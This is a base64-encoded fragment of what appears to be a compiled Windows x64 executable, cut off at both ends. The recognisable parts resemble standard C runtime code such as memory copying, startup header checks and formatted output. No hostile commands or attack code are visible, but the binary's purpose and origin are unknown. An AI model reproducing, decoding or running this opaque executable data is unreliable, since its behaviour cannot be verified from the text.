Ckn/yIgB9sECdA9Ig+kCZosECkmD6AJmiQH2wQR0DUiD6QSLBApJg+gEiQFNi8hJwekFdUFNi8hJwekDdBRIg+kISIsECkn/yUiJAXXwSYPgB02FwHUPSYvDw2ZmZg8fhAAAAAAASSvITIvRSI0UCul9/P//kEiLRAr4TItUCvBIg+kgSIlBGEyJURBIi0QKCEyLFApJ/8lIiUEITIkRddVJg+Af645Jg/ggD4YF////SQPI9sEPdQ5Ig+kQDxAECkmD6BDrG0iD6RAPEAwKSIvBgOHwDxAECg8RCEyLwU0rw02LyEnB6Qd0aA8pAesNZg8fRAAADylBEA8pCQ8QRArwDxBMCuBIgemAAAAADylBcA8pSWAPEEQKUA8QTApASf/JDylBUA8pSUAPEEQKMA8QTAogDylBMA8pSSAPEEQKEA8QDAp1rg8pQRBJg+B/DyjBTYvIScHpBHQaZmYPH4QAAAAAAA8pAUiD6RAPEAQKSf/JdfBJg+APdAhBDxAKQQ8RCw8pAUmLw8PMzMzMzMzMzMzMzMzMzMzMzGZmDx+EAAAAAABMi9kPttJJg/gQD4JcAQAAD7olsP8CAAFzDldIi/mLwkmLyPOqX+ttSbkBAQEBAQEBAUkPr9EPuiWK/wIAAg+CnAAAAEmD+EByHkj32YPhB3QGTCvBSYkTSQPLTYvISYPgP0nB6QZ1P02LyEmD4AdJwekDdBFmZmaQkEiJEUiDwQhJ/8l19E2FwHQKiBFI/8FJ/8h19kmLw8MPH4AAAAAAZmZmkGZmkEiJEUiJUQhIiVEQSIPBQEiJUdhIiVHgSf/JSIlR6EiJUfBIiVH4ddjrl2ZmZmZmZmYPH4QAAAAAAGZID27CZg9gwPbBD3QWDxEBSIvBSIPgD0iDwRBIK8hOjUQA8E2LyEnB6Qd0MusBkA8pAQ8pQRBIgcGAAAAADylBoA8pQbBJ/8kPKUHADylB0A8pQeAPKUHwddVJg+B/TYvIScHpBHQUDx+EAAAAAAAPKQFIg8EQSf/JdfRJg+APdAZBDxFECPBJi8PDSbkBAQEBAQEBAUkPr9FMjQ1PhP//Q4uEgcV7AABMA8hJA8hJi8NB/+EefAAAG3wAACx8AAAXfAAAQHwAADV8AAApfAAAFHwAAFV8AABNfAAARHwAAB98AAA8fAAAMXwAACV8AAAQfAAAZmZmDx+EAAAAAABIiVHxiVH5ZolR/YhR/8NIiVH16/JIiVHyiVH6ZolR/sNIiVHziVH7iFH/w0iJUfSJUfzDSIlR9maJUf7DSIlR94hR/8NIiVH4w8zMSIlcJBBmiUwkCFVIi+xIg+xQuP//AABmO8gPhJ8AAABIjU3g6OPh//9Ii13gSIuDOAEAAEiFwHUTD7dVEI1Cv2aD+Bl3ZWaDwiDrXw+3TRC6AAEAAGY7ynMlugEAAADogAAAAIXAdQYPt1UQ6z0Pt00QSIuDEAEAAA+2FAjrLEiNTSBBuQEAAABMjUUQRIlMJChIiUwkIEiLyOghigAAD7dVEIXAdAQPt1UggH34AHQLSItN8IOhyAAAAP0Pt8JIi1wkaEiDxFBdw8zMM9LpLf///8zpCwAAAMzMzOkDAAAAzMzMZolMJAhTSIPsILj//wAAD7faZjvIdQQzwOtFuAABAABmO8hzEEiLBWzmAgAPt8kPtwRI6ya5AQAAAEyNTCRASI1UJDBEi8H/FQO1AQAzyYXAdAUPt0wkQA+3wQ+3yyPBSIPEIFvDzMyDPRnmAgACRA+3ykyLwX0tSIvRM8lBD7cASYPAAmaFwHXzSYPoAkw7wnQGZkU5CHXxZkU5CEkPRMhIi8HDM8mL0esSZkU5CEkPRNBmQTkIdFpJg8ACQY1AAagOdeZmQTvJdSS4AQD//2YPbsjrBEmDwBDzQQ9vAGYPOmPIFXXvSGPBSY0EQMNBD7fBZg9uyPNBD28AZg86Y8hBcwdIY8FJjRRAdAZJg8AQ6+RIi8LDzDPSRI1CCulFiwAAzDPSRI1CCunFjgAAzEyLyjPSRI1CCunmjgAAzMxMi8oz0kSNQgrpBosAAMzMM9JEjUIK6Q2LAADMTIvKM9JEjUIK6eqKAADMzDPSRI1CCul9jgAAzEyLyjPSRI1CCumejgAAzMzMzMzMzMzMzMzMzMzMzGZmDx+EAAAAAABIg+wQTIkUJEyJXCQITTPbTI1UJBhMK9BND0LTZUyLHCUQAAAATTvTcxZmQYHiAPBNjZsA8P//QcYDAE0703XwTIsUJEyLXCQISIPEEMPMzMzMzMzMzGZmDx+EAAAAAABIK9FJg/gIciL2wQd0FGaQigE6BAp1LEj/wUn/yPbBB3XuTYvIScHpA3UfTYXAdA+KAToECnUMSP/BSf/IdfFIM8DDG8CD2P/DkEnB6QJ0N0iLAUg7BAp1W0iLQQhIO0QKCHVMSItBEEg7RAoQdT1Ii0EYSDtEChh1LkiDwSBJ/8l1zUmD4B9Ni8hJwekDdJtIiwFIOwQKdRtIg8EISf/Jde5Jg+AH64NIg8EISIPBCEiDwQhIiwwRSA/ISA/JSDvBG8CD2P/DzOkTAAAAzMzMiwUq6QIAiQ0k6QIAw8zMzEiNBbGZAABIjQ2OjgAASIkFM+MCAEiNBTyaAABIiQ0d4wIASIkFJuMCAEiNBW+aAABIiQ0w4wIASIkFGeMCAEiNBeKaAABIiQUT4wIASI0FbI4AAEiJBRXjAgBIjQX+mQAASIkFD+MCAEiNBVCZAABIiQUJ4wIASI0FKpoAAEiJBQPjAgDDzMxIiVwkEFdIg+wwvwEAAACLz+j6oAAAuE1aAABmOQU2f///dAQz2+s4SGMFZX///0iNDSJ///9IA8GBOFBFAAB147kLAgAAZjlIGHXYM9uDuIQAAAAOdgk5mPgAAAAPlcOJXCRA6HtdAACFwHUigz3w+gIAAnQF6KE0AAC5HAAAAOgLNQAAuf8AAADoheP//+h8RwAAhcB1IoM9xfoCAAJ0Beh2NAAAuRAAAADo4DQAALn/AAAA6Frj///oMWAAAJDo4ycAAIXAeQq5GwAAAOj5AAAA/xUXsAEASIkFEPwCAOgfoQAASIkFvOcCAOhfnAAAhcB5CrkIAAAA6HXk///o1J4AAIXAeQq5CQAAAOhi5P//i8/oo+T//4XAdAeLyOhQ5P//TIsFLecCAEyJBU7nAgBIixUP5wIAiw395gIA6HTJ//+L+IlEJCCF23UHi8joH+j//+hS5P//6xeL+IN8JEAAdQiLyOjo5P//zOgq5P//kIvHSItcJEhIg8QwX8O4TVoAAGY5Bcx9//90AzPAw0hjDfx9//9IjQW5ff//SAPIgTlQRQAAdeS4CwIAAGY5QRh12TPAg7mEAAAADnYJOYH4AAAAD5XAw8zMQFNIg+wggz2L+QIAAovZdAXoOjMAAIvL6KczAAC5/wAAAEiDxCBb6Rzi//9Ig+wo6FefAABIg8Qo6fb9///MzEiJXCQISIl0JBBXSIPsMDP/jU8B6I8AAACQjV8DiVwkIDsd7foCAH1jSGPzSIsF2foCAEiLDPBIhcl0TPZBGIN0EOixoAAAg/j/dAb/x4l8JCSD+xR8MUiLBa76AgBIiwzwSIPBMP8VeK8BAEiLDZn6AgBIiwzx6Pjm//9IiwWJ+gIASIMk8AD/w+uRuQEAAADoLgIAAIvHSItcJEBIi3QkSEiDxDBfw0iJXCQIV0iD7CBIY9lIjT1A0gIASAPbSIM83wB1EejVAAAAhcB1CI1IEeiR4v//SIsM30iLXCQwSIPEIF9I/yVorgEAQFNIg+wgSIvZ6OIsAACFwHULSIvTM8n/FeOuAQC5/wAAAEiDxCBb6fDg//9IiVwkCEiJbCQQSIl0JBhXSIPsIL8kAAAASI0dxNECAIvvSIszSIX2dBuDewgBdBVIi87/FZOuAQBIi87oG+b//0iDIwBIg8MQSP/NddRIjR2X0QIASItL+EiFyXQLgzsBdQb/FWOuAQBIg8MQSP/PdeNIi1wkMEiLbCQ4SIt0JEBIg8QgX8PMSIlcJAhIiXwkEEFWSIPsIEhj2UiDPcHvAgAAdRnoTjEAALkeAAAA6LgxAAC5/wAAAOgy4P//SAPbTI01HNECAEmDPN4AdAe4AQAAAOteuSgAAADoZAEAAEiL+EiFwHUP6N8UAADHAAwAAAAzwOs9uQoAAADoj/7//5BIi89JgzzeAHUTRTPAuqAPAADofysAAEmJPN7rBug45f//kEiLDVjRAgD/FRKtAQDrm0iLXCQwSIt8JDhIg8QgQV7DzMzMSIlcJAhIiXQkEFdIg+wgM/ZIjR2E0AIAjX4kg3sIAXUkSGPGSI0VIeQCAEUzwEiNDID/xkiNDMq6oA8AAEiJC+gLKwAASIPDEEj/z3XNSItcJDBIi3QkOI1HAUiDxCBfw8zMzEhjyUiNBS7QAgBIA8lIiwzISP8lgKwBAEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CAz20iL8kiL6UGDzv9FM8BIi9ZIi83orZ8AAEiL+EiFwHUmOQW/5QIAdh6Ly+iGLwAAjYvoAwAAOw2q5QIAi9lBD0feQTvedcRIi1wkMEiLbCQ4SIt0JEBIi8dIi3wkSEiDxCBBXsPMSIvESIlYCEiJaBBIiXAYSIl4IEFWSIPsIIs1YeUCADPbSIvpQYPO/0iLzeis2v//SIv4SIXAdSSF9nQgi8voDS8AAIs1N+UCAI2L6AMAADvOi9lBD0feQTvedcxIi1wkMEiLbCQ4SIt0JEBIi8dIi3wkSEiDxCBBXsPMzEiLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CAz20iL8kiL6UGDzv9Ii9ZIi83oWJ0AAEiL+EiFwHUrSIX2dCY5BcHkAgB2HovL6IguAACNi+gDAAA7DazkAgCL2UEPR95BO951wkiLXCQwSItsJDhIi3QkQEiLx0iLfCRISIPEIEFew8zMzEiJXCQISIlsJBBIiXQkGFdBVkFXSIPsIDPbSYvwSIvqQYPP/0yL8UyLxkiL1UmLzuijnQAASIv4SIXAdStIhfZ0JjkFOOQCAHYei8vo/y0AAI2L6AMAADsNI+QCAIvZQQ9H30E733W/SItcJEBIi2wkSEiLdCRQSIvHSIPEIEFfQV5fw4sF9uMCAIkN8OMCAMPMzMxAU0iD7CCL2eivLQAAg8j/gcPoAwAAOx3Q4wIAD0fYi8NIg8QgW8PMSIlcJBiJTCQIVldBVkiD7CBIY/mD//51EOiuEQAAxwAJAAAA6Z0AAACFyQ+IhQAAADs9hfUCAHN9SIvHSIvfSMH7BUyNNZrjAgCD4B9Ia/BYSYsE3g++TDAIg+EBdFeLz+iu0P//kEmLBN72RDAIAXQri8/o19P//0iLyP8VWqoBAIXAdQr/FaioAQCL2OsCM9uF23QV6MEQAACJGOgqEQAAxwAJAAAAg8v/i8/ovtX//4vD6xPoEREAAMcACQAAAOheDAAAg8j/SItcJFBIg8QgQV5fXsPMSIlcJBCJTCQIVldBVEFWQVdIg+wgQYvwTIvySGPZg/v+dRjoXBAAAIMgAOjEEAAAxwAJAAAA6ZEAAACFyXh1Ox2f9AIAc21Ii8NIi/tIwf8FTI0ltOICAIPgH0xr+FhJiwT8Qg++TDgIg+EBdEaLy+jHz///kEmLBPxC9kQ4CAF0EUSLxkmL1ovL6FUAAACL+OsW6FwQAADHAAkAAADo4Q8AAIMgAIPP/4vL6OjU//+Lx+sb6MsPAACDIADoMxAAAMcACQAAAOiACwAAg8j/SItcJFhIg8QgQV9BXkFcX17DzMzMSIlcJCBVVldBVEFVQVZBV0iNrCTA5f//uEAbAADoNvX//0gr4EiLBczLAgBIM8RIiYUwGgAARTPkRYv4TIvySGP5RIlkJEBBi9xBi/RFhcB1BzPA6W4HAABIhdJ1IOg9DwAARIkg6KUPAADHABYAAADo8goAAIPI/+lJBwAASIvHSIvPSI0VneECAEjB+QWD4B9IiUwkSEiLDMpMa+hYRYpkDThMiWwkWEUC5EHQ/EGNRCT/PAF3FEGLx/fQqAF1C+jaDgAAM8mJCOuaQfZEDQggdA0z0ovPRI1CAuhvnwAAi8/oIJ4AAEiLfCRIhcAPhEADAABIjQUs4QIASIsE+EH2RAUIgA+EKQMAAOizPAAASI1UJGRIi4jAAAAAM8BIOYE4AQAAi/hIi0QkSEiNDfTgAgBAD5THSIsMwUmLTA0A/xWZpwEAM8mFwA+E3wIAADPAhf90CUWE5A+EyQIAAP8VwqcBAEmL/olEJGgzwA+3yGaJRCREiUQkYEWF/w+EBgYAAESL6EWE5A+FowEAAIoPTItsJFhIjRWK4AIAgPkKD5TARTPAiUQkZEiLRCRISIsUwkU5RBVQdB9BikQVTIhMJG2IRCRsRYlEFVBBuAIAAABIjVQkbOtJD77J6DKcAACFwHQ0SYvHSCvHSQPGSIP4AQ+OswEAAEiNTCREQbgCAAAASIvX6CygAACD+P8PhNkBAABI/8frHEG4AQAAAEiL10iNTCRE6AugAACD+P8PhLgBAACLTCRoM8BMjUQkREiJRCQ4SIlEJDBIjUQkbEG5AQAAADPSx0QkKAUAAABIiUQkIEj/x/8VYqYBAESL6IXAD4RwAQAASItEJEhIjQ2j3wIATI1MJGBIiwzBM8BIjVQkbEiJRCQgSItEJFhFi8VIiwwI/xVcpAEAhcAPhC0BAACLRCRAi99BK94D2EQ5bCRgD4ylBAAARTPtRDlsJGR0WEiLRCRIRY1FAcZEJGwNSI0NP98CAEyJbCQgTItsJFhIiwzBTI1MJGBIjVQkbEmLTA0A/xX8owEAhcAPhMMAAACDfCRgAQ+MzwAAAP9EJEAPt0wkRP/D628Pt0wkROtjQY1EJP88AXcZD7cPM8Bmg/kKRIvoZolMJERBD5TFSIPHAkGNRCT/PAF3OOgRnwAAD7dMJERmO8F1dIPDAkWF7XQhuA0AAACLyGaJRCRE6O6eAAAPt0wkRGY7wXVR/8P/RCRATItsJFiLx0ErxkE7x3NJM8Dp2P3//4oHTIt8JEhMjSVu3gIAS4sM/P/DSYv/QYhEDUxLiwT8QcdEBVABAAAA6xz/FZujAQCL8OsN/xWRowEAi/BMi2wkWEiLfCRIi0QkQIXbD4XEAwAAM9uF9g+EhgMAAIP+BQ+FbAMAAOj5CwAAxwAJAAAA6H4LAACJMOlN/P//SIt8JEjrB0iLfCRIM8BMjQ3q3QIASYsM+UH2RA0IgA+E6AIAAIvwRYTkD4XYAAAATYvmRYX/D4QqAwAAug0AAADrAjPARItsJEBIjb0wBgAASIvIQYvEQSvGQTvHcydBigQkSf/EPAp1C4gXQf/FSP/HSP/BSP/BiAdI/8dIgfn/EwAAcs5IjYUwBgAARIvHRIlsJEBMi2wkWEQrwEiLRCRISYsMwTPATI1MJFBJi0wNAEiNlTAGAABIiUQkIP8VG6IBAIXAD4Ti/v//A1wkUEiNhTAGAABIK/hIY0QkUEg7xw+M3f7//0GLxLoNAAAATI0NCN0CAEErxkE7xw+CQP///+m9/v//QYD8Ak2L5g+F4AAAAEWF/w+ESAIAALoNAAAA6wIzwESLbCRASI29MAYAAEiLyEGLxEErxkE7x3MyQQ+3BCRJg8QCZoP4CnUPZokXQYPFAkiDxwJIg8ECSIPBAmaJB0iDxwJIgfn+EwAAcsNIjYUwBgAARIvHRIlsJEBMi2wkWEQrwEiLRCRISYsMwTPATI1MJFBJi0wNAEiNlTAGAABIiUQkIP8VLqEBAIXAD4T1/f//A1wkUEiNhTAGAABIK/hIY0QkUEg7xw+M8P3//0GLxLoNAAAATI0NG9wCAEErxkE7xw+CNf///+nQ/f//RYX/D4RoAQAAQbgNAAAA6wIzwEiNTYBIi9BBi8RBK8ZBO8dzL0EPtwQkSYPEAmaD+Ap1DGZEiQFIg8ECSIPCAkiDwgJmiQFIg8ECSIH6qAYAAHLGSI1FgDP/TI1FgCvISIl8JDhIiXwkMIvBuen9AADHRCQoVQ0AAJkrwjPS0fhEi8hIjYUwBgAASIlEJCD/FR2iAQBEi+iFwA+EI/3//0hjx0WLxUiNlTAGAABIA9BIi0QkSEiNDU7bAgBIiwzBM8BMjUwkUEiJRCQgSItEJFhEK8dIiwwI/xUMoAEAhcB0CwN8JFBEO+9/tesI/xVnoAEAi/BEO+8Pj838//9Bi9xBuA0AAABBK95BO98Pgv7+///ps/z//0mLTA0ATI1MJFBFi8dJi9ZIiUQkIP8Vt58BAIXAdAuLXCRQi8bpl/z///8VEqABAIvwi8PpiPz//0yLbCRYSIt8JEjpefz//4vO6DsIAADp7Pj//0iLfCRISI0FktoCAEiLBPhB9kQFCEB0CkGAPhoPhKb4///oXwgAAMcAHAAAAOjkBwAAiRjps/j//yvYi8NIi40wGgAASDPM6OLQ//9Ii5wkmBsAAEiBxEAbAABBX0FeQV1BXF9eXcPMzMxIi8RIiVgISIloEEiJcBhXQVRBVUFWQVdIg+xATYthCE2LOUmLWThNK/z2QQRmTYvxTIvqSIvpD4XeAAAAQYtxSEiJSMhMiUDQOzMPg20BAACL/kgD/4tE+wRMO/gPgqoAAACLRPsITDv4D4OdAAAAg3z7EAAPhJIAAACDfPsMAXQXi0T7DEiNTCQwSYvVSQPE/9CFwHh9fnSBfQBjc23gdShIgz1q6wIAAHQeSI0NYesCAOgsUAAAhcB0DroBAAAASIvN/xVK6wIAi0z7EEG4AQAAAEmL1UkDzOhFmgAASYtGQItU+xBEi00ASIlEJChJi0YoSQPUTIvFSYvNSIlEJCD/FTSgAQDoR5oAAP/G6TX///8zwOmoAAAASYtxIEGLeUhJK/TpiQAAAIvPSAPJi0TLBEw7+HJ5i0TLCEw7+HNw9kUEIHRERTPJhdJ0OEWLwU0DwEKLRMMESDvwciBCi0TDCEg78HMWi0TLEEI5RMMQdQuLRMsMQjlEwwx0CEH/wUQ7ynLIRDvKdTKLRMsQhcB0B0g78HQl6xeNRwFJi9VBiUZIRItEywyxAU0DxEH/0P/HixM7+g+Cbf///7gBAAAATI1cJEBJi1swSYtrOEmLc0BJi+NBX0FeQV1BXF/DzMzM6SMBAADMzMxIg+w4SItEJGBIiUQkIOjFAQAAzEiLxEiJWBBIiXAYSIl4IFVIjahI+///SIHssAUAAEiLBd/BAgBIM8RIiYWgBAAAQYv4i/KL2YP5/3QF6BiZAACDZCQwAEiNTCQ0M9JBuJQAAADoXeb//0iNRCQwSI1N0EiJRCQgSI1F0EiJRCQo6D0ZAABIi4W4BAAASImFyAAAAEiNhbgEAACJdCQwSIPACIl8JDRIiUVoSIuFuAQAAEiJRCRA/xWangEASI1MJCCL+OhWIQAAhcB1EIX/dQyD+/90B4vL6I6YAABIi42gBAAASDPM6OvN//9MjZwksAUAAEmLWxhJi3MgSYt7KEmL413DzMxIiw0h1wIASP8lsp0BAMzMSIkNEdcCAMNIiVwkCEiJbCQQSIl0JBhXSIPsMEiL6UiLDfLWAgBBi9lJi/hIi/L/FXudAQBEi8tMi8dIi9ZIi81IhcB0F0iLXCRASItsJEhIi3QkUEiDxDBfSP/gSItEJGBIiUQkIOhUAAAAzMzMzEiD7DhIg2QkIABFM8lFM8Az0jPJ6H////9Ig8Q4w8zMSIPsOEiDZCQgAEUzyUUzwDPSM8noX////0iDZCQgAEUzyUUzwDPSM8noAgAAAMzMSIPsKLkXAAAA6LCPAQCFwHQHuQUAAADNKUG4AQAAALoXBADAQY1IAegP/v//uRcEAMBIg8Qo6e0fAADMSIlcJAhXSIPsIEiL+UiLDQjWAgD/FZqcAQBIi89Ii9j/FYacAQBIiQXv1QIASIvDSItcJDBIg8QgX8PMSIlcJBBIiUwkCFdIg+wgSIvZM8BIhckPlcCFwHUW6L0DAADHABYAAADoCv///0iDyP/rHOjru///kEiLy+gaAAAASIv4SIvL6HO8//9Ii8dIi1wkOEiDxCBfw8xIiVwkEEiJbCQYSIl0JCBXQVRBVUFWQVe4UBAAAOiq6P//SCvgSIsFQL8CAEgzxEiJhCRAEAAATIvx6OG+//8z20hj6EE5Xgh9BEGJXggz0ovNRI1CAeiBkgAASIvwSIXAeQlIg8j/6XQCAABBi1YYSIvFTIvtScH9BYPgH0iNDWhp//9Ki4zpsGsDAExr+FhFimQPOEUC5EHQ/PfCCAEAAHUPSWNGCEgr8EiLxukuAgAASYs+SSt+EPbCAw+EHQEAAEGA/AEPhegAAABBOVwPSA+E3QAAAEjR70E5Xgh0ykmLVA9ARTPAi83o7ZEAAEyNJfZo//9Li4zssGsDAEiL2Ek7RA9AD4VX////SYsMD0yNTCQwSI1UJEBFM/ZBuAAQAABMiXQkIP8VVpkBAIXAD4Qt////RTPASIvWi83omZEAAEiFwA+IF////4tEJDBIO/gPhwr///9IjUwkQEiF/3RASI1UJEBIA9BI/89IO8pzMIA5DXUUSI1C/0g7yHMagHkBCnUUSP/B6w8PtgFKD76EIOBjAwBIA8hI/8FIhf91yEiNRCRASCvISI0EC+ksAQAAQfZEDwiAdBZJi0YQ6wuAOAp1A0j/x0j/wEk7BnLwSIX2dRxIi8fpAQEAAITSeO/onAEAAMcAFgAAAOlw/v//9sIBD4TXAAAAQTleCHUISIv76ckAAABJY14ISSteEEkDHkH2RA8IgA+EpgAAADPSi81EjUIC6K6QAABIO8Z1Q0mLThBBuAAAAABIjQQZSIvQSCvRSDvISQ9H0EiF0nQZSIvBSCvBgDkKdQNI/8NI/8BI/8FIO8Jy7UH3RhgAIAAA60xFM8BIi9aLzehZkAAASIXAD4jX/f//uAACAABIO9h3E0H2RhgIdAxB90YYAAQAAIvYdARJY14kSI0FOGf//0qLhOiwawMAQfZEBwgEdANI/8NBgPwBdQNI0etIK/NBgPwBdQNI0e9IjQQ3SIuMJEAQAABIM8zoPMn//0yNnCRQEAAASYtbOEmLa0BJi3NISYvjQV9BXkFdQVxfw8zMzEiD7CjoPy4AAEiFwHUJSI0FH8ACAOsESIPAFEiDxCjDSIlcJAhXSIPsIIv56BcuAABIhcB1CUiNBfe/AgDrBEiDwBSJOOj+LQAASI0d378CAEiFwHQESI1YEIvP6KcAAACJA0iLXCQwSIPEIF/DzMxIg+wo6M8tAABIhcB1CUiNBau/AgDrBEiDwBBIg8Qow0BTSIPsIEiL2UiFyXUK6CX7//+NQxbrHeibLQAASIXAdQlIjQV7vwIA6wRIg8AUiwCJAzPASIPEIFvDzEBTSIPsIEiL2UiFyXUK6On6//+NQxbrHehfLQAASIXAdQlIjQU7vwIA6wRIg8AQiwCJAzPASIPEIFvDzEyNFbm9AgAz0k2LwkSNSghBOwh0L//CTQPBSGPCSIP4LXLtjUHtg/gRdwa4DQAAAMOBwUT///+4FgAAAIP5DkEPRsHDSGPCQYtEwgTDzMzMQFNIg+wgi9no4ywAAEiFwHUHuAwAAADrG+jSLAAASIXAdQlIjQWyvgIA6wRIg8AUiRgzwEiDxCBbw8zMQFNIg+wgi9nopywAAEiFwHUHuAwAAADrG+iWLAAASIXAdQlIjQVyvgIA6wRIg8AQiRgzwEiDxCBbw8zMSIPsOEyJTCQgTYvITIvCSIvRSI0NZwIAAOiWAAAASIPEOMPMSIPsOEyJRCQgTIvCSIvRSI0NeqgAAEUzyehyAAAASIPEOMPMSIPsOEyJTCQgTYvITIvCSIvRSI0NU6gAAOhOAAAASIPEOMPMSIPsOEyJTCQgTYvITIvCSIvRSI0N65oAAOgqAAAASIPEOMPMSIPsOEyJRCQgTIvCSIvRSI0N2gEAAEUzyegGAAAASIPEOMPMSIlcJAhIiXQkGEiJVCQQV0FWQVdIg+wgTYvxSYvwSIv6TIv5M8BIhdIPlcCFwHUV6Lf9///HABYAAADoBPn//4PI/+tHM8BNhcAPlcCFwHTfSIvK6Ne1//+QSIvP6JoAAACL2EyLTCRgTYvGSIvWSIvPQf/Xi/BIi9eLy+hDAAAAkEiLz+hCtv//i8ZIi1wkQEiLdCRQSIPEIEFfQV5fw0iD7DhMiUQkIEyLwkiL0UiNDQaaAABFM8noQv///0iDxDjDzIXJdDJTSIPsIPdCGAAQAABIi9p0HEiLyuintv//gWMY/+7//4NjJABIgyMASINjEABIg8QgW8PMSIlcJAhIiXwkEEFWSIPsIEiL2eh0uP//i8joyYsAAIXAD4SVAAAA6AC1//9Ig8AwSDvYdQQzwOsT6O60//9Ig8BgSDvYdXW4AQAAAP8F4ssCAPdDGAwBAAB1YUyNNZbOAgBIY/hJiwT+SIXAdSu5ABAAAOjw6P//SYkE/kiFwHUYSI1DIEiJQxBIiQO4AgAAAIlDJIlDCOsVSIlDEEiJA8dDJAAQAADHQwgAEAAAgUsYAhEAALgBAAAA6wIzwEiLXCQwSIt8JDhIg8QgQV7DzEiJXCQYVVZXQVRBVUFWQVdIjawkIPz//0iB7OAEAABIiwXitwIASDPESImF0AMAADPASIvxSIlMJHBIiVWISI1NkEmL0E2L4UyJTCRQiUWARIvwiUQkWIv4iUQkRIlEJEiJRCR8iUQkeIvYiUQkTOh8wP//6Kf7//9FM9JIiUW4SIX2dSrolvv//8cAFgAAAOjj9v//M8k4Tah0C0iLRaCDoMgAAAD9g8j/6dwHAABMi0WITYXAdM1FD7c4QYvyRIlUJEBFi+pBi9JMiVWwZkWF/w+EoAcAAEG7IAAAAEG5AAIAAEmDwAJMiUWIhfYPiIQHAABBD7fHuVgAAABmQSvDZjvBdxVIjQ0bKQIAQQ+3xw++TAjgg+EP6wNBi8pIY8JIY8lIjRTISI0F+SgCAA++FALB+gSJVCRoi8qF0g+EGggAAP/JD4QiCQAA/8kPhL8IAAD/yQ+EdQgAAP/JD4RgCAAA/8kPhB0IAAD/yQ+EQQcAAP/JD4XuBgAAQQ+3z4P5ZA+PDAIAAA+EDwMAAIP5QQ+EyQEAAIP5Qw+ESgEAAI1Bu6n9////D4SyAQAAg/lTD4SNAAAAuFgAAAA7yA+EWQIAAIP5WnQXg/lhD4SaAQAAg/ljD4QbAQAA6dIAAABJiwQkSYPECEyJZCRQSIXAdDtIi1gISIXbdDK/LQAAAEEPuuYLcxgPvwDHRCRMAQAAAJkrwtH4RIvo6ZgAAABED78oRIlUJEzpigAAAEiLHQPEAgBIi8voC7cAAEUz0kyL6OtuQffGMAgAAHUDRQvzg3wkRP9JixwkuP///38PRPhJg8QITIlkJFBFhPMPhGoBAABIhdtFi+pID0QdtsMCAEiL84X/fiZEOBZ0IQ+2DkiNVZDoUoYAAEUz0oXAdANI/8ZB/8VI/8ZEO+982ot0JEC/LQAAAEQ5VCR4D4VzBQAAQfbGQA+ENAQAAEEPuuYID4P7AwAAZol8JFy/AQAAAIl8JEjpGgQAAEH3xjAIAAB1A0UL80EPtwQkSYPECMdEJEwBAAAATIlkJFBmiUQkYEWE83Q3iEQkZEiLRZBEiFQkZUxjgNQAAABMjU2QSI1UJGRIjU3Q6LeJAABFM9KFwHkOx0QkeAEAAADrBGaJRdBIjV3QQb0BAAAA6VL////HRCR8AQAAAGZFA/u4ZwAAAEGDzkBIjV3QQYvxhf8PiT0CAABBvQYAAABEiWwkROmAAgAAuGcAAAA7yH7Ug/lpD4T3AAAAg/luD4S0AAAAg/lvD4SVAAAAg/lwdFaD+XMPhIr+//+D+XUPhNIAAACD+XgPhdr+//+NQa/rRUiF28dEJEwBAAAASA9EHU/CAgBIi8PrDP/PZkQ5EHQISIPAAoX/dfBIK8NI0fhEi+jpn/7//78QAAAAQQ+67g+4BwAAAIlFgEG5EAAAAEG/AAIAAEWE9nl3QY1JIGaDwFGNUdJmiUwkXGaJRCRe62RBuQgAAABFhPZ5T0G/AAIAAEUL9+tKSYs8JEmDxAhMiWQkUOh6yP//RTPShcAPhAT8//9FjVogRYTzdAVmiTfrAok3x0QkeAEAAADpngMAAEGDzkBBuQoAAABBvwACAACLVCRIuACAAABEhfB0Ck2LBCRJg8QI6z1BD7rmDHLvSYPECEWE83QbTIlkJFBB9sZAdAhND79EJPjrH0UPt0Qk+OsXQfbGQHQHTWNEJPjrBUWLRCT4TIlkJFBB9sZAdA1NhcB5CEn32EEPuu4IRIXwdQpBD7rmDHIDRYvAhf95B78BAAAA6wtBg+b3QTv/QQ9P/4t1gEmLwEiNnc8BAABI99gbySPKiUwkSIvP/8+FyX8FTYXAdB8z0kmLwEljyUj38UyLwI1CMIP4OX4CA8aIA0j/y+vUi3QkQEiNhc8BAACJfCREK8NI/8NEi+hFhfcPhA/9//+FwLgwAAAAdAg4Aw+E/vz//0j/y0H/xYgD6fH8//91EWZEO/h1QUG9AQAAAOm2/f//QTv5Qb2jAAAAQQ9P+Yl8JERBO/1+J4HHXQEAAEhjz+if4v//SIlFsEiFwA+Ehf3//0iL2Iv3RItsJETrA0SL70mLBCRIiw34vwIASYPECEyJZCRQQQ++/0hj9kiJRcD/FX6OAQBIjU2QSIlMJDCLTCR8RIvPiUwkKEiNTcBMi8ZIi9NEiWwkIP/QQYv+geeAAAAAdBtFhe11FkiLDbq/AgD/FTyOAQBIjVWQSIvL/9C5ZwAAAGZEO/l1GoX/dRZIiw2NvwIA/xUXjgEASI1VkEiLy//Qvy0AAABAODt1CEEPuu4ISP/DSIvL6ISyAACLdCRARTPSRIvo6eX7//9B9sYBdA+4KwAAAGaJRCRc6fX7//9B9sYCdBO4IAAAAGaJRCRcjXjhiXwkSOsJi3wkSLggAAAARIt8JFhIi3QkcEUr/UQr/0H2xgx1EkyNTCRAi8hMi8ZBi9fotgMAAEiLRbhMjUwkQEiNTCRcTIvGi9dIiUQkIOjtAwAASIt8JHBB9sYIdBtB9sYEdRVMjUwkQLkwAAAATIvHQYvX6HMDAAAzwDlEJEx1cEWF7X5rSIv7QYv1SItFkEyNTZBIjUwkYExjgNQAAABIi9f/zuhOhQAARTPSTGPghcB+KkiLVCRwD7dMJGBMjUQkQOjsAgAASQP8RTPShfZ/ukyLZCRQSIt8JHDrMkyLZCRQSIt8JHCDzv+JdCRA6yNIi0W4TI1MJEBMi8dBi9VIi8tIiUQkIOgzAwAARTPSi3QkQIX2eCJB9sYEdBxMjUwkQLkgAAAATIvHQYvX6LkCAACLdCRARTPSQbsgAAAASItFsEiFwHQTSIvI6GPE//9FM9JFjVogTIlVsIt8JERMi0WIi1QkaEG5AAIAAEUPtzhmRYX/D4Vs+P//RDhVqHQLSItNoIOhyAAAAP2LxkiLjdADAABIM8zoLrz//0iLnCQwBQAASIHE4AQAAEFfQV5BXUFcX15dw0EPt8eD+El0PIP4aHQvuWwAAAA7wXQMg/h3dZlBD7ruC+uSZkE5CHULSYPAAkEPuu4M64FBg84Q6Xj///9FC/PpcP///0EPtwBBD7ruD2aD+DZ1FmZBg3gCNHU